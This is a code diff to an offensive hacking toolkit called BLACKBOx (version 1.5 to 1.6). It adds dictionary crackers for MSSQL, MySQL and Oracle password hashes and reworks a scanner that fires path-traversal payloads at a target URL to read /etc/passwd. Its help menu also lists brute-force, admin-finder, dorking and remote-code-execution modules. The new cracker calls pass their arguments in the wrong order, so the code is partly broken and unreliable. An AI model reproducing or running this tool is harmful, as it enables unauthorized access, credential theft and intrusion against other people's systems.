@@ -24,13 +24,14 @@ from sys import platform
 from time import gmtime, strftime
 from optparse import OptionParser
 from passlib.hash import nthash
+from passlib.hash import mssql2000 as m20,oracle11 as oracle11,mssql2005 as m25, mysql323, mysql41
 from pexpect import pxssh
 from ftplib import FTP
 __author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
 __emailadd__   = 'blackdoor197@riseup.net'
 __twitter__    = 'https://twitter.com/0x676'
-__version__    = '1.5'
+__version__    = '1.6'
 __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOx v%s' % (__version__)
 
@@ -39,27 +40,27 @@ def __banner__():
 	print (color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _")
 	print (color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|")
 	print (color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|")
-	print (color.W+color.BOLD+"                                                {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC)
+	print (color.W+color.BOLD+"                                                {"+color.M+__version__+"#Dev"+color.W+"}"+color.ENDC)
 
 def __help__():
-	print (color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}")
+	print (color.W+color.BOLD+"Usage   : "+color.W+sys.argv[0]+color.R+" {Module}"+color.ENDC)
 	print (color.BOLD+color.Y+"Bruteforcing : "+color.ENDC)
-	print ("\t+ Wordpress Bruteforce  : wordpress_brute        | Bruteforcing WP PANEL")
-	print ("\t+ Admin Page Finder     : admin_brute            | Find Admin Page")
-	#print ("\t+ PMA Page Finder       : pma_brute              | Find PhpMyAdmin Page")
-	print ("\t+ SSH Bruteforce        : ssh_brute              | Bruteforcing SSH LOGIN")
-	print ("\t+ FTP Bruteforce        : ftp_brute              | Bruteforcing FTP LOGIN")
-	print (color.BOLD+color.Y+"Information Gathering : "+color.ENDC)
-	print ("\t+ Dnsinfo               : dns_info               | Get All Website from IP")
-	print (color.BOLD+color.Y+"Exploit : "+color.ENDC)
-	print ("\t+ Joomla Rce            : rce_joomla             | 1.5 - 3.4.5 remote code execution")
-	print ("\t+ Magento Rce           : rce_magento            | Magento eCommerce - Remote Code Execution")
-	print ("\t+ PrestaShop Exploit    : presta_exploit         | Prestashop Multi Modules Arbitrary File Upload Exploit")
-	print (color.BOLD+color.Y+"Dorking : "+color.ENDC)
-	print ("\t+ Google Dorker         : google_dorker(LFI)| Google Dorker ")
-	print ("\t+ Bing Dorker           : bing_dorker(LFI)  | Bing Dorker via IP")
-	print (color.BOLD+color.Y+"Cracking : "+color.ENDC)
-	print ("\t+ Crack Hash MD5-SHA512 : hash_killer            | Crack MD5-SHA* HASH\n\t\t     SHA1-SHA224\n\t\t     SHA256-SHA384")
+	print (color.W+"\t+ Wordpress Bruteforce  : wordpress_brute        | Bruteforcing WP PANEL")
+	print (color.W+"\t+ Admin Page Finder     : admin_brute            | Find Admin Page")
+	#print (color.W+"\t+ PMA Page Finder       : pma_brute              | Find PhpMyAdmin Page")
+	print (color.W+"\t+ SSH Bruteforce        : ssh_brute              | Bruteforcing SSH LOGIN")
+	print (color.W+"\t+ FTP Bruteforce        : ftp_brute              | Bruteforcing FTP LOGIN")
+	print (color.W+color.BOLD+color.Y+"Information Gathering : "+color.ENDC)
+	print (color.W+"\t+ Dnsinfo               : dns_info               | Get All Website from IP")
+	print (color.W+color.BOLD+color.Y+"Exploit : "+color.ENDC)
+	print (color.W+"\t+ Joomla Rce            : rce_joomla             | 1.5 - 3.4.5 remote code execution")
+	print (color.W+"\t+ Magento Rce           : rce_magento            | Magento eCommerce - Remote Code Execution")
+	print (color.W+"\t+ PrestaShop Exploit    : presta_exploit         | Prestashop Multi Modules Arbitrary File Upload Exploit")
+	print (color.W+color.BOLD+color.Y+"Dorking : "+color.ENDC)
+	print (color.W+"\t+ Google Dorker         : google_dorker(LFI)| Google Dorker ")
+	print (color.W+"\t+ Bing Dorker           : bing_dorker(LFI)  | Bing Dorker via IP")
+	print (color.W+color.BOLD+color.Y+"Cracking : "+color.ENDC)
+	print (color.W+"\t+ Crack Hash MD5-SHA512 : hash_killer            | Crack MD5-SHA* HASH\n\t\t     SHA1-SHA224\n\t\t     SHA256-SHA384")
 
 def __update__():
 	pass
@@ -150,26 +151,30 @@ class checker:
         "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
         "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
         "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
-        lfi = re.findall(r'=(.*)', url)
-        for i in lfi:
-            print (color.C+color.BOLD+"[+] "+color.BL+"TARGET"+color.W+" : "+color.ENDC+url+color.ENDC)
-            print (color.R+"------------------------------------------------------------------"+color.ENDC)	
-            l=re.sub(i, '', url)
-            for payload in payloads:
-                payload=payload.strip()
-                print (color.W+color.BOLD+"[+] "+color.BL+"Payload "+color.W+"  : "+color.ENDC+payload+color.ENDC)
-                lfii = l+payload
-                r = requests.get(lfii)
-                code = str(r.status_code)
-                html = r.content
-                if "root" in html:
-                	print (color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
-                	print (color.Y+color.BOLD+"[+] "+color.BL+"LFI FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
-                	print (color.R+"------------------------------------------------------------------"+color.ENDC)	
-                else:
-                	print (color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
-                	print (color.R+color.BOLD+"[+] "+color.BL+"NOT FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
-                	print (color.R+"------------------------------------------------------------------"+color.ENDC)	
+        if "=" in url:
+        	lfi = re.findall(r'=(.*)', url)
+        	for i in lfi:
+        		print (color.C+color.BOLD+"[+] "+color.BL+"TARGET"+color.W+" : "+color.ENDC+url+color.ENDC)
+        		print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)	
+        		l=re.sub(i, '', url)
+        		for payload in payloads:
+        			payload=payload.strip()
+        			print ("\t"+color.W+color.BOLD+"[+] "+color.BL+"Payload "+color.W+"  : "+color.ENDC+payload+color.ENDC)
+        			lfii = l+payload
+        			r = requests.get(lfii)
+        			code = str(r.status_code)
+        			html = r.content
+        			if "root" in html:
+        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
+        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"LFI FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
+        				print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)	
+        			else:
+        				print ("\t"+color.Y+color.BOLD+"[+] "+color.BL+"Requests"+color.W+"  : "+color.ENDC+code+color.ENDC)
+        				print ("\t"+color.R+color.BOLD+"[+] "+color.BL+"NOT FOUND"+color.W+" : "+color.ENDC+lfii+color.ENDC)
+        				print ("\t"+color.R+"------------------------------------------------------------------"+color.ENDC)
+        else:
+        	pass
+
 	def sqli(self, url):
 		pass
 
@@ -847,6 +852,93 @@ class cracker:
 					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
 		stop = timeit.default_timer()
 		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+	def mssql2000(self,wordlist, ha):
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MSSQL2000 HASH PATH : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
+		start = timeit.default_timer()
+		wordlist = open(wordlist, "r")
+		wordlist = wordlist.readlines()
+		ha = open(ha, "r")
+		ha = ha.readlines()
+		for word in wordlist:
+			word=word.strip()
+			for has in ha:
+				has = has.strip()
+				h = m20.verify(has,word)
+				if h ==True:
+					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+		stop = timeit.default_timer()
+		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+	def mssql2005(self,wordlist, ha):
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MSSQL2005 HASH PATH : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		start = timeit.default_timer()
+		wordlist = open(wordlist, "r")
+		wordlist = wordlist.readlines()
+		ha = open(ha, "r")
+		ha = ha.readlines()
+		for word in wordlist:
+			word=word.strip()
+			for has in ha:
+				has = has.strip()
+				h = m25.verify(has,word)
+				if h ==True:
+					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+		stop = timeit.default_timer()
+		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+#mysql323
+	def mysql323(self,wordlist, ha):
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MYSQL323 HASH PATH  : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		start = timeit.default_timer()
+		wordlist = open(wordlist, "r")
+		wordlist = wordlist.readlines()
+		ha = open(ha, "r")
+		ha = ha.readlines()
+		for word in wordlist:
+			word=word.strip()
+			for has in ha:
+				has = has.strip()
+				h = mysql323.verify(has,word)
+				if h ==True:
+					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+		stop = timeit.default_timer()
+		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+#mysql41
+	def mysql41(self,wordlist, ha):
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MYSQL41 HASH PATH   : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		start = timeit.default_timer()
+		wordlist = open(wordlist, "r")
+		wordlist = wordlist.readlines()
+		ha = open(ha, "r")
+		ha = ha.readlines()
+		for word in wordlist:
+			word=word.strip()
+			for has in ha:
+				has = has.strip()
+				h = mysql41.verify(has,word)
+				if h ==True:
+					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+		stop = timeit.default_timer()
+		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+	def oracle11(self,wordlist, ha):
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" ORACLE HASH PATH    : "+ha+color.ENDC)
+		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH       : "+wordlist+color.ENDC)
+		start = timeit.default_timer()
+		wordlist = open(wordlist, "r")
+		wordlist = wordlist.readlines()
+		ha = open(ha, "r")
+		ha = ha.readlines()
+		for word in wordlist:
+			word=word.strip()
+			for has in ha:
+				has = has.strip()
+				h = oracle11.verify(has,word)
+				if h ==True:
+					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n\t"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+has+" : "+word+color.ENDC)
+		stop = timeit.default_timer()
+		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 
 ###
 ###EXPLOIT 0DAY
@@ -990,8 +1082,6 @@ def __main__():
 	for arg in sys.argv:
 		if (arg=="--help" or arg=="-h"):
 			__help__()
-
-
 		if (arg=="wordpress_brute"):
 			parser = OptionParser()
 			parser.add_option("--url",
@@ -1115,15 +1205,25 @@ def __main__():
 			parser.add_option("--sha384", help="Path of SHA384 hash")
 			parser.add_option("--sha512", help="Path of SHA512 hash")
 			parser.add_option("--ntlm", help="Path of NTLM hash")
+			parser.add_option("--mssql2000", help="Path of MSSQL2000 hash")
+			parser.add_option("--mssql2005", help="Path of MSSQL2005 hash")
+			parser.add_option("--mysql323", help="Path of MYSQL323 hash")
+			parser.add_option("--mysql41", help="Path of MYSQL41 hash")
+			parser.add_option("--oracle11", help="Path of ORACLE11 hash")
 			(options,args) = parser.parse_args()
-			wordlist = options.wordlist
-			md5 = options.md5
-			sha1 = options.sha1
-			sha224 = options.sha224
-			sha256 = options.sha256
-			sha384 = options.sha384
-			sha512 = options.sha512
-			ntlm = options.ntlm
+			wordlist       = options.wordlist
+			md5            = options.md5
+			sha1           = options.sha1
+			sha224         = options.sha224
+			sha256         = options.sha256
+			sha384         = options.sha384
+			sha512         = options.sha512
+			ntlm           = options.ntlm
+			mssql2000      = options.mssql2000
+			mssql2005      = options.mssql2005
+			mysql323       = options.mysql323
+			mysql41        = options.mysql41
+			oracle11       = options.oracle11
 			crack = cracker()
 			if md5 and wordlist:
 				crack.md5(wordlist, md5)
@@ -1139,6 +1239,16 @@ def __main__():
 				crack.sha512(wordlist, sha512)
 			if ntlm and wordlist:
 				crack.ntlm(ntlm,wordlist)
+			if mssql2000 and wordlist:
+				crack.mssql2000(mssql2000,wordlist)
+			if mssql2005 and wordlist:
+				crack.mssql2005(mssql2005,wordlist)
+			if mysql323 and wordlist:
+				crack.mysql323(mysql323,wordlist)
+			if mysql41 and wordlist:
+				crack.mysql41(mysql41,wordlist)
+			if oracle11 and wordlist:
+				crack.oracle11(oracle11,wordlist)
 		if (arg=="-u" or arg=="--update"):
 			__update__()
 		if (arg=="presta_exploit"):
